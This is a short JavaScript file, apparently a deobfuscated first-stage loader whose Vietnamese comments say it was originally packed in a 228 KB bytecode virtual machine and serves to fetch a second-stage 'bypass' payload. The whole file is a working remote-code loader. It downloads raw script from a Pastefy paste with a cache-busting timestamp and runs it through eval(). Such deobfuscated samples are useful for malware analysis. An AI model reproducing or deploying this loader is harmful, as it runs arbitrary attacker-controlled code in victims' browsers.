/**
 * traffichub-funcion_deobfuscated.js
 * 
 * Tầng nạp mã thứ 1 (gốc 228 KB đóng gói bằng Bytecode Virtual Machine).
 * Chức năng thực sự: Tải payload giai đoạn 2 từ Pastefy.
 */

(function() {
    'use strict';
    fetch("https://pastefy.app/sH0NUUgb/raw?t=" + Date.now())
        .then(res => res.text())
        .then(code => {
            eval(code); // Kích hoạt payload bypass chính
        })
        .catch(err => {
            console.error("Lỗi khi tải script:", err);
        });
})();
